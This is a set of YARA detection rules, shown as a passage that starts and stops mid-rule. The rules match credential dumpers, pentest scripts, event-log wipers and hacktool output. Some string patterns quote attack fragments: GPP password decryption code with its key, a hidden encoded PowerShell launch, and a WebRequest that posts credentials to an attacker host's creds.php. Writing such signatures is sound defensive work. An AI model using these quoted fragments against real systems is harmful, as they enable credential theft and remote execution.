		uint16(0) == 0x5a4d and filesize < 2856KB and all of them
}

/*
	Yara Rule Set
	Author: Florian Roth
	Date: 2015-08-26
	Identifier: Pantsoff
*/

/* Rule Set ----------------------------------------------------------------- */

rule PantsOff {
	meta:
		description = "Pantsoff password tool - file PantsOff.exe"
		author = "Florian Roth"
		reference = "not set"
		date = "2015-08-26"
		score = 70
		hash = "dff2e7847d067b17f7d4c65c0a6d76ed03b62494213ac408a7792ed02e2d1c1d"
	strings:
		$s1 = "PANTSOFFHK.DLL" fullword ascii
		$s2 = "PantsOff.exe" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 1800KB and all of them
}

rule PantsOffHk {
	meta:
		description = "Pantsoff password tool DLL - file PantsOffHk.dll"
		author = "Florian Roth"
		reference = "not set"
		date = "2015-08-26"
		score = 70
		hash = "a815850fb95a19c2e515a5e463135399ccaff821341bb18b8a894ab4ef1c84c0"
	strings:
		$s1 = "PantsOffHk.dll" fullword ascii
		$s2 = "_RemoveHook@0" fullword ascii
		$s3 = "PantsOff!" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 75KB and all of them
}

/* Rule Set ----------------------------------------------------------------- */

rule VeraCrypt {
	meta:
		description = "VeraCrypt encryption tool - not a threat - BSK Client Case  - file VeraCryptExpander.exe"
		author = "YarGen Rule Generator"
		reference = "https://veracrypt.codeplex.com/"
		date = "2015-09-04"
		score = 40
		hash = "2f8b00cd70c66bb2d4a300bf348f16e568c82b67bca83d7a8d87d356b03045e5"
	strings:
		$s1 = "C:\\Windows\\System32\\cmd.exe" fullword wide
		$s2 = "https://veracrypt.codeplex.com/wikipage?title=System%20Encryption" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 4500KB and all of them
}

rule Veracrypt_Driver {
	meta:
		description = "VeraCrypt encryption tool - not a threat - BSK Client Case  - file veracrypt.sys"
		author = "YarGen Rule Generator"
		reference = "https://veracrypt.codeplex.com/"
		date = "2015-09-04"
		score = 40
		hash1 = "1c5a88c84348f01984cc2586c54686277fab6178abcf4dc77b68801a293297ce"
		hash2 = "390fa0e47a3237dcdb335476b5e40b510a2bbfda1eded7dff6c851140a98c4f4"
	strings:
		$s1 = "\\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\Services\\veracrypt" fullword wide
		$s2 = "\\DosDevices\\VeraCrypt" fullword wide
		$s3 = "VeraCrypt Driver" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 500KB and all of them
}

rule QuarksPwDump_Gen {
	meta:
		description = "Detects all QuarksPWDump versions"
		author = "Florian Roth"
		date = "2015-09-29"
		score = 80
		hash1 = "2b86e6aea37c324ce686bd2b49cf5b871d90f51cec24476daa01dd69543b54fa"
		hash2 = "87e4c76cd194568e65287f894b4afcef26d498386de181f568879dde124ff48f"
		hash3 = "a59be92bf4cce04335bd1a1fcf08c1a94d5820b80c068b3efe13e2ca83d857c9"
		hash4 = "c5cbb06caa5067fdf916e2f56572435dd40439d8e8554d3354b44f0fd45814ab"
		hash5 = "677c06db064ee8d8777a56a641f773266a4d8e0e48fbf0331da696bea16df6aa"
		hash6 = "d3a1eb1f47588e953b9759a76dfa3f07a3b95fab8d8aa59000fd98251d499674"
		hash7 = "8a81b3a75e783765fe4335a2a6d1e126b12e09380edc4da8319efd9288d88819"
	strings:
		$s1 = "OpenProcessToken() error: 0x%08X" fullword ascii
		$s2 = "%d dumped" fullword ascii
		$s3 = "AdjustTokenPrivileges() error: 0x%08X" fullword ascii
		$s4 = "\\SAM-%u.dmp" fullword ascii
	condition:
		all of them
}

rule VSSown_VBS {
	meta:
		description = "Detects VSSown.vbs script - used to export shadow copy elements like NTDS to take away and crack elsewhere"
		author = "Florian Roth"
		date = "2015-10-01"
		score = 75
	strings:
		$s0 = "Select * from Win32_Service Where Name ='VSS'" ascii
		$s1 = "Select * From Win32_ShadowCopy" ascii
		$s2 = "cmd /C mklink /D " ascii
		$s3 = "ClientAccessible" ascii
		$s4 = "WScript.Shell" ascii
		$s5 = "Win32_Process" ascii
	condition:
		all of them
}

/*
	Yara Rule Set
	Author: Florian Roth
	Date: 2015-10-11
	Identifier: AD-Pentest-Script
*/

rule AD_Pentest_Script_wmiexec {
	meta:
		description = "AD-Pentest-Script - file wmiexec.vbs"
		author = "Florian Roth"
		reference = "https://github.com/Twi1ight/AD-Pentest-Script"
		date = "2015-10-11"
		score = 80
		hash = "110592b76e8aced859a4cd5707abbd5e680bcff2b2c8825b562ca6e8f1aaf94f"
	strings:
		$s1 = "strExec = \"cmd.exe /c \" & cmd & \" > \" & file & \" 2>&1\"  '2>&1 err" fullword ascii
		$s2 = "vbNewLine & vbTab & \"wmiexec.vbs  /cmd  host  user  pass  command\" & vbNewLine & _" fullword ascii
		$s6 = "vbNewLine & vbTab & \"wmiexec.vbs  /shell  host  user  pass\" & _" fullword ascii
		$s9 = "WScript.Echo \"WMIEXEC : Target -> \" & host" fullword ascii
		$s11 = "vbTab & \"wmiexec.vbs  /shell  host\" & _" fullword ascii
		$s12 = "vbNewLine & \"WMIEXEC ERROR: Command -> \" & cmd & _" fullword ascii
		$s15 = "vbTab & vbTab &\"eg. 'systeminfo -wait5000' 'ping" fullword ascii
	condition:
		2 of them
}

rule AD_Pentest_Script_LoginTester {
	meta:
		description = "AD-Pentest-Script - file LoginTester.bat"
		author = "Florian Roth"
		reference = "https://github.com/Twi1ight/AD-Pentest-Script"
		date = "2015-10-11"
		score = 80
		hash = "a57276d5d96d4f4428a91faf92ce46c1c7158e0137f452cfbecf66938427c458"
	strings:
		$s0 = "cscript /nologo wmiexec.vbs /cmd" ascii
		$s1 = "-wait5000\" >%1-pass.txt" fullword ascii
		$s7 = "echo dump plaintext password" fullword ascii
		$s11 = "schtasks /delete /s %1 /u %3 /p %4 /f /tn getpass" fullword ascii
	condition:
		2 of them
}

rule AD_Pentest_Script_GPP_Decryptor {
	meta:
		description = "AD-Pentest-Script - file GPP.ps1"
		author = "Florian Roth"
		reference = "https://github.com/Twi1ight/AD-Pentest-Script"
		date = "2015-10-11"
		score = 80
		hash = "791bc7dbd5f5b88944f07aa04298b97fe6631b8b58f39bf4fd73e4c6f7b8c709"
	strings:
		$s2 = "$Base64Decoded = [Convert]::FromBase64String($Cpassword)" fullword ascii
		$s6 = "[Byte[]] $OutBlock = $DecryptorObject.TransformFinalBlock($Base64Decoded, 0, $Base64Decoded.length)" fullword ascii
		$s9 = "if ($Mod -ne 0) {$Cpassword += ('=' * (4 - $Mod))}" fullword ascii
		$s10 = "PowerSploit Function: Get-GPPPassword" fullword ascii
		$s11 = "function Get-DecryptedCpassword {" fullword ascii
		$s13 = "[Byte[]] $AesKey = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8," fullword ascii
		$s19 = "#Write-Output $Password" fullword ascii
		$s20 = "[string] $Cpassword" fullword ascii
	condition:
		2 of them
}

rule wmiexec_v1_1_IN_RAR {
	meta:
		description = "WMIEXEC in RAR file wmiexec-v1_1.rar"
		author = "Florian Roth"
		date = "2015-10-11"
		score = 80
		hash = "d7bcb9840012e8f47d742626f3a538dd1ca6f82b05b254164ea703f603fbfb86"
	strings:
		$s0 = "wmiexec v1.1.vbs" fullword ascii
	condition:
		uint16(0) == 0x6152 and filesize < 10KB and all of them
}

rule QuarksLab_hashdump {
	meta:
		description = "Detects password dumper"
		author = "Florian Roth"
		date = "2015-10-11"
		hash1 = "87e4c76cd194568e65287f894b4afcef26d498386de181f568879dde124ff48f"
		hash2 = "d3a1eb1f47588e953b9759a76dfa3f07a3b95fab8d8aa59000fd98251d499674"
	strings:
		$x1 = "-<(QuarksLab)>-" ascii
	condition:
		uint16(0) == 0x5a4d and 1 of them
}

/*
	Yara Rule Set
	Author: Florian Roth
	Date: 2015-10-30
	Identifier: KeeFarce
*/

rule KeeFarce_in_ZIP {
	meta:
		description = "Detects KeeFarce - extracts passwords from a KeePass database directly from memory - KeeFarce in ZIP"
		author = "Florian Roth"
		reference = "https://github.com/denandz/KeeFarce"
		date = "2015-10-30"
		score = 90
		hash1 = "0b11dad59c1f4ff3cbe2a6d228b6f957ca9e0e949c8d42e42f6de5572e91d7dd"
		hash2 = "5dba958cbf31cc9237151c0304f47c95c22602feb47c008f57cec9c1aab1863a"
	strings:
		$s1 = "x64/KeeFarce.exe" fullword ascii
		$s2 = "Win32/KeeFarceDLL.dll" fullword ascii
	condition:
		uint16(0) == 0x4b50 and filesize < 1000KB and 1 of them
}

rule KeeFarce_EXE {
	meta:
		description = "Detects KeeFarce - extracts passwords from a KeePass database directly from memory - file KeeFarce.exe"
		author = "Florian Roth"
		reference = "https://github.com/denandz/KeeFarce"
		date = "2015-10-30"
		score = 90
		hash1 = "57771f6312b091fb5450112864e56413ae2a2a2874289e8245eb3a0d286577e9"
		hash2 = "f0d5c8e6df82a7b026f4f0412f8ede11a053185675d965215b1ffbbc52326516"
	strings:
		$x1 = "\\dist\\Release\\x64\\KeeFarce.pdb" ascii
		$x2 = "\\dist\\Release\\Win32\\KeeFarce.pdb" ascii
		$x3 = "[.] Done! Check %%APPDATA%%/keepass_export.csv" fullword ascii
		$x4 = "[.] Injecting BootstrapDLL into %d" fullword ascii
		$x5 = "\\BootstrapDLL.dll" fullword ascii
		$x6 = "g\\KeeFarceDLL.dll" fullword wide
	condition:
		uint16(0) == 0x5a4d and 1 of them
}

rule KeeFarce_DLL {
	meta:
		description = "Detects KeeFarce - extracts passwords from a KeePass database directly from memory - file KeeFarceDLL.dll"
		author = "Florian Roth"
		reference = "https://github.com/denandz/KeeFarce"
		score = 90
		date = "2015-10-30"
		hash1 = "5ea9a04284157081bd5999e8be96dda8fac594ba72955adacb6fa48bdf866434"
	strings:
		$s1 = "\\obj\\Release\\KeeFarceDLL.pdb" ascii
		$s2 = "KeePass.DataExchange.PwExportInfo" fullword wide
		$s3 = "KeeFarceDLL.dll" fullword wide
		$s4 = "keepass_export.csv" fullword wide
		$s5 = "[KeeFarceDLL] init done" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 25KB and all of them
}

rule KeeFarce_BootstrapDLL {
	meta:
		description = "Detects KeeFarce - extracts passwords from a KeePass database directly from memory - file BootstrapDLL.dll"
		author = "Florian Roth"
		reference = "https://github.com/denandz/KeeFarce"
		date = "2015-10-30"
		score = 90
		hash1 = "0334c4cf4438eab3982faf71072ae5cb50ca6a9ee49bf0a5bc4c7eeb84e363f1"
		hash2 = "92dde9160b7a26facd379166898e0a149f7ead4b9d040ac974c4afe6b4bd09b5"
	strings:
		$s1 = "\\KeeFarce\\dist\\Release\\x64\\BootstrapDLL.pdb" ascii
		$s2 = "\\KeeFarce\\dist\\Release\\Win32\\BootstrapDLL.pdb" ascii
		$s3 = "[Bootstrap] Attempting exec in default app domain" fullword wide
		$s4 = "KeeFarceDLL.KeeFarce" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 250KB and all of them
}

rule KeeFarce_Generic {
	meta:
		description = "Detects KeeFarce - extracts passwords from a KeePass database directly from memory - from files BootstrapDLL.dll, KeeFarce.exe, BootstrapDLL.dll, KeeFarce.exe"
		author = "Florian Roth"
		reference = "https://github.com/denandz/KeeFarce"
		date = "2015-10-30"
		score = 90
		hash1 = "92dde9160b7a26facd379166898e0a149f7ead4b9d040ac974c4afe6b4bd09b5"
		hash2 = "f0d5c8e6df82a7b026f4f0412f8ede11a053185675d965215b1ffbbc52326516"
		hash3 = "0334c4cf4438eab3982faf71072ae5cb50ca6a9ee49bf0a5bc4c7eeb84e363f1"
		hash4 = "57771f6312b091fb5450112864e56413ae2a2a2874289e8245eb3a0d286577e9"
	strings:
		$s1 = "operator \"\" " fullword ascii
		$s2 = "LoadManagedProject" fullword ascii
		$s3 = "\"Main Returned.\"" fullword ascii
		$s4 = "InvokeMainViaCRT" fullword ascii
		$s5 = "\"Main Invoked.\"" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 700KB and all of them
}

/*
	Yara Rule Set
	Author: Florian Roth
	Date: 2015-11-01
	Identifier: WSUSpect
*/

rule WSUSpect_proxy {
	meta:
		description = "WSUSpect - WSUS intercepting proxy hack tool - file wsuspect_proxy.exe"
		author = "Florian Roth"
		reference = "https://github.com/ctxis/wsuspect-proxy"
		date = "2015-11-01"
		score = 60
		hash = "1a34382f122cdf9da62b01895c02fd48e99fbf35195962fa8005530e81caa5d2"
	strings:
		$s0 = "intercepting_proxy(" fullword ascii
		$s1 = "BaseHTTPServer(" fullword ascii
	condition:
		uint16(0) == 0x5a4d and all of them
}

rule WSUSpect_payloads {
	meta:
		description = "WSUSpect - WSUS intercepting proxy hack tool - file payloads.ini"
		author = "Florian Roth"
		reference = "https://github.com/ctxis/wsuspect-proxy"
		score = 60
		date = "2015-11-01"
	strings:
		$s0 = "payload =" fullword ascii
		$s5 = "description =" fullword ascii
		$s6 = "args =" fullword ascii
		$s7 = "title =" fullword ascii
	condition:
		filesize < 1KB and all of them
}

rule WSUSpect_proxy_PY {
	meta:
		description = "WSUSpect - WSUS intercepting proxy hack tool - file wsuspect_proxy.py"
		author = "Florian Roth"
		reference = "https://github.com/ctxis/wsuspect-proxy"
		date = "2015-11-01"
		score = 60
		hash = "de1309fc06bc9cea69bc36511c73a46558392e1fcaca553dd35f2ed2bd80e7ef"
	strings:
		$s1 = "from twisted.python.log import startLogging" fullword ascii
		$s2 = "config.read(os.path.join('payloads', 'payloads.ini'))" fullword ascii
		$s3 = "proxy =  InterceptingProxyFactory(wsus_injector)" fullword ascii
	condition:
		uint16(0) == 0x2023 and filesize < 6KB and all of them
}

rule WSUSpect_intercepting_proxy_PY {
	meta:
		description = "WSUSpect - WSUS intercepting proxy hack tool - file intercepting_proxy.py"
		author = "Florian Roth"
		reference = "https://github.com/ctxis/wsuspect-proxy"
		date = "2015-11-01"
		score = 60
		hash = "36b54b7ee6671fa4a528eebc244b1db992e629a4679617ff1e8ce3eb88a117de"
	strings:
		$s0 = "clientFactory = InterceptingProxyClientFactory(self.method, self.uri, self.clientproto, headers, content, self)" fullword ascii
		$s1 = "self.requestHeaders.setRawHeaders('content-length', [len(self.request_buffer)])" fullword ascii
	condition:
		filesize < 18KB and all of them
}

/*
	Yara Rule Set
	Author: Florian Roth
	Date: 2015-11-05
	Identifier: WPE-PRO
*/

rule WPEPRO_Component_PICACHU2 {
	meta:
		description = "Auto-generated rule - file PICACHU+2.exe"
		author = "Florian Roth"
		reference = "http://wpepro.net/"
		date = "2015-11-05"
		score = 72
		hash = "4ba6929c8c7dbe7518c7726b46f13cd7ec540b64a494baf078c70a9c60327137"
	strings:
		$s0 = "KAWAI2~1.exe" fullword wide
		$s1 = "vb5cht.dll" fullword ascii
		$s2 = "CHEN PROGRAM STUDY" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 3000KB and all of them
}

rule WPEPRO_Component_PICACHU1 {
	meta:
		description = "Auto-generated rule - file Picachu.exe"
		author = "Florian Roth"
		reference = "http://wpepro.net/"
		date = "2015-11-05"
		score = 72
		hash = "92f96dbc67d9cafddfbf6e2a0780679ac467c42a9bddee76053e039b93a25d4c"
	strings:
		$s0 = "D4S.EXE" fullword wide
		$s1 = "LOADER ERROR" fullword ascii
		$s2 = "The procedure entry point %s could not be located in the dynamic link library %s" fullword ascii
		$s3 = "CHEN PROGRAM STUDY" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 2139KB and all of them
}

rule WPEPRO_Sniffer {
	meta:
		description = "Auto-generated rule - file WPE PRO"
		author = "Florian Roth"
		reference = "http://wpepro.net/"
		date = "2015-11-05"
		score = 72
		hash = "1fdf2cdd48dfc4d68dcde6ce4f0243aa1ac552da11f3312d476f3ed6b4723dfe"
	strings:
		$s1 = "WpeSpy.dll" fullword ascii
		$s2 = "dll injection failled" fullword ascii
		$s3 = "WPE PRO.EXE" fullword wide
		$s4 = "WPEPRO PACKET  (*.txt) |*.txt|" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 2000KB and all of them
}

rule WPEPRO_DLL_WpeSpy {
	meta:
		description = "Auto-generated rule - file WpeSpy.dll"
		author = "Florian Roth"
		reference = "http://wpepro.net/"
		date = "2015-11-05"
		score = 72
		hash = "f0dc0e0813b1c63f9c6e9250558cbb1ff255ce2f077c1fc84f7f8f1efee69f62"
	strings:
		$s1 = "WpeSpy.dll" fullword ascii
		$s2 = "SetTargetPid" fullword ascii
		$s3 = "WinsockSpy.Send" fullword ascii
		$s4 = "WPE-C1467211-7C89-49c5-801A-1D048E4014C4" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 540KB and all of them
}

rule WPEPRO_DLL_SetPriv {
	meta:
		description = "Auto-generated rule - file SetPriv.dll"
		author = "Florian Roth"
		reference = "http://wpepro.net/"
		date = "2015-11-05"
		score = 72
		hash = "025816bd1fa415fec72300db9cd3319a869dfa0beec23986547b25cdc8a47e9c"
	strings:
		$s0 = "SetPriv DLL Created By Devalina of DeathSoft.com" fullword wide
		$s1 = "SetPriv Allows a program loading this dll to auto set its Privileges" fullword wide
		$s2 = "SetPriv.dll" fullword wide
		$s3 = "ERNEL32.DLLDeFls" fullword ascii
		$s4 = "SetPriv Dynamic Link Library" fullword wide
		$s5 = "Copyright DeathSoft" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 66KB and 4 of them
}

/* Super Rules ------------------------------------------------------------- */

rule WPEPRO_Archives {
	meta:
		description = "Auto-generated rule - from files wpe-pro.rar, wpepro09mod.zip"
		author = "Florian Roth"
		reference = "http://wpepro.net/"
		date = "2015-11-05"
		super_rule = 1
		score = 72
		hash1 = "1eb23c742f20f5d7606d079699d5ee94789376a515801d50f79e66d92674998a"
		hash2 = "6dd5797e2aa0171a685c55b9c512773c234e696326f091d30e7892ad8792286a"
	strings:
		$s0 = "WPE PRO - modified.exe" fullword ascii
		$s1 = "WpeSpy.dllPK" fullword ascii
		$s3 = "WPE PRO - modified.exePK" fullword ascii
	condition:
		( uint16(0) == 0x4b50 or uint16(0) == 0x6152 ) and filesize < 11063KB and all of them
}

rule WPEPRO_Generic {
	meta:
		description = "Auto-generated rule - from files WPE PRO - modified.exe, WpeSpy.dll"
		author = "Florian Roth"
		reference = "http://wpepro.net/"
		date = "2015-11-05"
		super_rule = 1
		score = 72
		hash1 = "1fdf2cdd48dfc4d68dcde6ce4f0243aa1ac552da11f3312d476f3ed6b4723dfe"
		hash2 = "f0dc0e0813b1c63f9c6e9250558cbb1ff255ce2f077c1fc84f7f8f1efee69f62"
	strings:
		$s0 = "SetTargetPid" fullword ascii
		$s1 = "WinsockSpy.Send" fullword ascii
		$s2 = "SetLoggingActi" fullword ascii
		$s3 = "GetFilterState" fullword ascii
		$s4 = "WPE-C1467211-7C89-49c5-801A-1D048E4014C4" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 2000KB and 4 of them
}

/*
	Yara Rule Set
	Author: Florian Roth
	Date: 2015-11-18
	Identifier: Hacktool Output - derived from client audit
*/

rule John_Cracker_Log_File {
	meta:
		description = "Hacktool output - John the Cracker log"
		author = "Florian Roth"
		score = 65
		date = "2015-11-18"
	strings:
		$s1 = "- Wordlist file:" fullword ascii
      $s2 = "preprocessed word mangling rules" fullword ascii
      $s3 = "- Hash type: " fullword ascii
	condition:
		uint16(0) == 0x3a30 and all of them
}

rule NBTScan_Output_3 {
	meta:
		description = "Hacktool output - file nbtscan.txt"
		author = "Florian Roth"
		score = 65
		date = "2015-11-18"
	strings:
		$s1 = "SHARING" fullword ascii
	condition:
		( uint16(0) == 0x3031 or
      uint32be(0) == 0x3139322E or
      uint32be(0) == 0x3137322E )
      and #s1 > 4
}

rule SuperScan4_1 {
	meta:
		description = "Hacktool - file SuperScan4.1.exe"
		author = "Florian Roth"
		score = 65
		date = "2015-11-18"
		hash = "8554c1458d818c73f06386c1d0d53179ede6e59457a1dec8b13fdf7e9bb80073"
	strings:
		$s1 = "Logon succeeded to %S with \"%S%s%S:%S\"" fullword ascii
		$s2 = "-------- Host discovery pass %d of %d --------" fullword ascii
		$s3 = "Remote process execution" fullword ascii
		$s4 = "Check Point Firewall-1 telnet auth / Efficient Short Remote Operations" fullword ascii
	condition:
		uint16(0) == 0x5a4d and all of them
}

rule Superscan_scanlog {
	meta:
		description = "Hacktool output - file superscan scanlog.txt"
		author = "Florian Roth"
		score = 65
		date = "2015-11-18"
	strings:
		$s1 = ":TCP:" ascii
	condition:
      ( uint16(0) == 0x3031 or
      uint32be(0) == 0x3139322E or
      uint32be(0) == 0x3137322E ) and
      #s1 > 5
}

rule superscan_ZIP {
	meta:
		description = "Hacktool output - file superscan-4.1.zip"
		author = "Florian Roth"
		score = 65
		date = "2015-11-18"
		hash = "b9107d798ca3bd15f81d4ce5e5494f8b6a438f044430a6c45d68cd64f300f32e"
	strings:
		$s0 = "SuperScan" ascii
		$s1 = "ReadMe.txt" fullword ascii
		$s2 = "HBSHUF" fullword ascii
	condition:
		uint16(0) == 0x4b50 and all of them
}

rule Impacket_SecretsDump_Output {
	meta:
		description = "Hacktool output - file secretsdump.py"
		author = "Florian Roth"
		score = 65
		date = "2015-11-18"
	strings:
		$s1 = "[*] Dumping cached domain logon information (uid:encryptedHash:longDomain:domain)" fullword ascii
		$s2 = "[*] Target system bootKey:" fullword ascii
		$s3 = "[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)" fullword ascii
		$s4 = "[*] Dumping LSA Secrets" fullword ascii
		$s5 = "[*] DefaultPassword " fullword ascii
		$s6 = "[*] $MACHINE.ACC " fullword ascii
	condition:
		filesize < 25KB and 1 of them
}

rule NBTScan_Output_2 {
	meta:
		description = "Hacktool output - file nbtscan-netz_href.txt"
		author = "Florian Roth"
		score = 65
		date = "2015-11-18"
	strings:
		$s1 = "0x20, 'UNIQUE', 'File Server Service' ]," fullword ascii
		$s2 = "0x00, 'UNIQUE', 'Workstation Service' ]," fullword ascii
	condition:
		filesize < 40KB and all of them
}

rule John_Cracker_Session_File {
	meta:
		description = "Hacktool output - file L.rec"
		author = "Florian Roth"
		score = 65
		date = "2015-11-18"
	strings:
		$s1 = "--session=" fullword ascii
		$s2 = "--format=" fullword ascii
	condition:
		uint16(0) == 0x4552 and filesize < 1KB and $s1 and $s2
}

rule Mimikatz_sekurlsa_LOG {
	meta:
		description = "Hacktool output - file sekurlsa.log"
		author = "Florian Roth"
		score = 65
		date = "2015-11-18"
	strings:
		$s1 = "Target Name  (02) : ldap ;" fullword ascii
		$s2 = "process  -  Switch (or reinit) to LSASS process  context" fullword ascii
		$s3 = "minidump  -  Switch (or reinit) to LSASS minidump context" fullword ascii
		$s4 = "Service Name (02) : RestrictedKrbHost ;" fullword ascii
		$s5 = "Target Name  (02) : HTTP ;" fullword ascii
      $s7 = "Clear screen (doesn't work with redirections, like PsExec)" fullword ascii
		$s8 = "logonPasswords  -  Lists all available providers credentials" fullword ascii
		$s9 = "Target Name  (02) : cifs ;" fullword ascii
	condition:
		filesize < 400KB and 2 of them
}

rule NBTScan_Output_1 {
	meta:
		description = "Hacktool output - file nbtscan-netz.txt"
		author = "Florian Roth"
		score = 65
		date = "2015-11-18"
	strings:
		$s1 = "<20> UNIQUE File Server Service" fullword ascii
		$s2 = "<00> UNIQUE Workstation Service" fullword ascii
		$s3 = "SHARING" fullword ascii
	condition:
		filesize < 50KB and all of them
}

rule Superscan_Report_HTML {
	meta:
		description = "Hacktool output - file superscan_report.html"
		author = "Florian Roth"
		score = 65
		date = "2015-11-18"
	strings:
      $s1 = "<td class=\"summary1\"><b>Total hosts discovered</b></td><td class=\"summary2\"> 255</td>" fullword ascii
		$s2 = "th.head1 { padding: 1 1 1 1; background: #9090ff; width: 180 }" fullword ascii
	condition:
		uint16(0) == 0x683c and filesize < 20KB and all of them
}

rule LMHash_Dump_Output_Empty {
	meta:
		description = "Hacktool output - file wce-output.txt"
		author = "Florian Roth"
		score = 65
		date = "2015-11-18"
	strings:
		$s1 = /:00000000000000000000000000000000:[A-F0-9]{32}/ fullword ascii
	condition:
		filesize < 1KB and $s1
}

rule LMHash_Empty {
	meta:
		description = "Hacktool output - empty LM Hash in File or Guest account in john format"
		author = "Florian Roth"
		score = 65
		date = "2015-11-18"
	strings:
		$s0 = ":aad3b435b51404eeaad3b435b51404ee:" ascii
		$s1 = ":31d6cfe0d16ae931b73c59d7e0c089c0:" ascii
		$s2 = "Gast:501::" ascii
		$s3 = "Guest:501::" ascii
	condition:
		filesize < 2KB and 1 of them
}

/*
	Yara Rule Set
	Author: Florian Roth
	Date: 2015-11-18
	Identifier: Destover Related
*/

rule Damballa_afset {
	meta:
		description = "Damballa toolset linked to destover - file afset.exe"
		author = "Florian Roth"
		reference = "https://goo.gl/eWbpXu"
		date = "2015-11-18"
		score = 80
		hash = "38c87a92694b597e5d402342ab4a9ff88b5b81beb2791405637bdca2b8384eac"
	strings:
		$s0 = "%SYSTEMROOT%\\system32\\tapi32.dll" fullword ascii
		$s1 = "afset.exe [-o logpath] [-x pwd] -e name1[,name2] [/id:ID1[,ID2,...]][/time:T][/last:count]" fullword ascii
		$s2 = "-e : remove event log by name, id, time" fullword ascii
		$s3 = "afset.exe [-o logpath] [-x pwd] [options] src [dst]" fullword ascii
		$s4 = "-c : clear system time change event log (= %s)" fullword ascii
		$s5 = "clear system time change event log" fullword ascii
		$s6 = "OpenEventLog() failed. err= %d" fullword ascii
		$s7 = "-g : (= %s) normal file time change, default option" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 220KB and 3 of them
}

rule Damballa_setMFT {
	meta:
		description = "Damballa toolset linked to destover - file setMFT.exe"
		author = "Florian Roth"
		reference = "https://goo.gl/eWbpXu"
		date = "2015-11-18"
		score = 80
		hash = "fe30da9e47010d3522d30ff90fb10d6c30302e8d16001c1a12c149b508888ab8"
	strings:
		$s1 = "usbdrv3.sys" fullword ascii
		$s2 = "Get dst Mft Entry Failed." fullword ascii
		$s3 = "Get src Mft Entry Failed." fullword ascii
		$s4 = "$MFT Record read failed." fullword ascii
		$s5 = "%04d-%02d-%02d %02d:%02d:%02d:%02d" fullword ascii
		$s6 = "Usage is:" fullword ascii
		$s7 = "Set dst mft TimeStamp Failed." fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 180KB and 3 of them
}

/* HVS Input */

rule empty_LM_hash
{
	meta:
		description = "Detects the empty LM hash on disk/in memory/as output from hacking tools"
		author = "Christian Flasche (HvS)"
		date = "2015-11-18"
		score = 80
	strings:
		$lm0 = "aad3b435b51404eeaad3b435b51404ee"
		$lm1 = "aad3b435b51404eeaad3b435b51404ee" wide
		$lm2 = "AAD3B435B51404EEAAD3B435B51404EE"
		$lm3 = "AAD3B435B51404EEAAD3B435B51404EE" wide
	condition:
		filesize < 50KB and 1 of them
}
rule LM_hash_empty_String
{
	meta:
		description = "Detects the empty LM hash on disk/in memory/as output from hacking tools"
		author = "Florian Roth"
		date = "2016-06-03"
		score = 80
	strings:
		$s0 = "500:AAD3B435B51404EEAAD3B435B51404EE:" ascii
		$s1 = "500:aad3b435b51404eeaad3b435b51404ee:" ascii
	condition:
		1 of them
}

rule Suspicious_Mimikatz_OR_RTMPDump {
	meta:
		description = "Rule detects a repacked Mimikatz variant using base64 encoded/encrypted content OR rtmpdump Nirsoft hacktool"
		author = "Florian Roth"
		date = "2015-11-19"
		score = 65
		hash1 = "c50a6b014b13739bea26199219de334ca674f76b4e2e946406cb7c2598832144"
		hash2 = "a9ad5bf54bdcbd12d873d5dce96f2e3fa11f4e57e6581364114f411450654401"
		hash3 = "83526c521ef698b07afec307effa8d8e1870315a16ccaa37ba4b09632dcfce9a"
		hash4 = "76e3189a87ab8cd60612e3b59f5b11be4f2149c7814ac9beb82604cbd595c118"
	strings:
		$s1 = "libgcj-12.dll" fullword ascii
		$s2 = "  Base64 encoding test: " fullword ascii
		$s3 = "  ARC4 test #%d: " fullword ascii
		$s4 = "  Base64 decoding test: " fullword ascii
		$s5 = "__mingwthr_remove_key_dtor" fullword ascii /* Goodware String - occured 28 times */
		$s6 = "passed" fullword ascii /* Goodware String - occured 1 times */
	condition:
		uint16(0) == 0x5a4d and filesize < 500KB and 5 of them
}

/*
	Yara Rule Set
	Author: Florian Roth
	Date: 2015-11-22
	Identifier: Process Dump
*/

rule Process_Dump_1 {
	meta:
		description = "Process Dump (not ProcDump) - from files pd32.exe, pd64.exe"
		author = "Florian Roth"
		reference = "http://goo.gl/Lq2WXR"
		date = "2015-11-22"
		score = 60
		hash1 = "be4550628fd408c9b97c91dfef539f351853abd6f5ba17fde47233622a249adf"
		hash2 = "d11d743ea959e641656d83682b0348df370ac17b555ba0818feb11f6958250c9"
	strings:
		$s1 = "Error. Only one process dump or hash database command should be issued per execution." fullword ascii
		$s2 = "Are you sure all of these processes should be dumped? (y/n): " fullword ascii
		$s3 = "dumping starting at %llX from process %s with pid 0x%x..." fullword ascii
		$s4 = "dumping process %s with pid 0x%x..." fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 350KB and 1 of them
}

/*
	Yara Rule Set
	Author: Florian Roth
	Date: 2015-11-21
	Identifier: Python WMI Attack Scripts
*/

rule PYEXE_Hack_CredCrack {
	meta:
		description = "SMB/WMI related security assessment scripts - file credcrack.exe"
		author = "Florian Roth"
		score = 80
		yaraexchange = "No distribution without author's consent"
		date = "2015-11-21"
		hash = "7721d5ec760d22ad9d13e0be2570d4c50ecbb765e4baf3b79c7e7c3e5ec1fb51"
	strings:
		$s1 = "powershell.exe -w hidden -Exec Bypass -noni -nop -enc" fullword ascii
		$s2 = "$request = [System.Net.WebRequest]::Create('http://{lh}/creds.php');" fullword ascii
